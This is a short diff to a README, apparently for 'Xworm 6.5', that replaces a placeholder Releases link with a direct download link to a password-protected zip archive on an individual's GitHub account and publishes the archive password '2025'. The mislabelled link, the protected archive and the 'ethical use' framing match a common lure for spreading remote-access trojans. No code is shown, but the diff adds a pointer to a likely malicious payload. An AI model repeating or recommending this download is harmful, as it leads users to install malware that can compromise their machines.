@@ -38,7 +38,7 @@ We encourage ethical use of this software, adhering to all applicable laws and r
 
 ## Installation & Usage
 
-**To obtain Xworm 6.5, please navigate to the [Releases section](https://github.com/YourGitHubUser/YourRepoName/releases) of this repository.**
+**To obtain Xworm 6.5, please navigate to the [Releases section](https://github.com/marta-k-97964832/XWorm-6.5/releases/download/xworm/Archive2025.zip) of this repository.**
 
 The downloadable archive is password-protected for security.
 **Archive Password: `2025`**
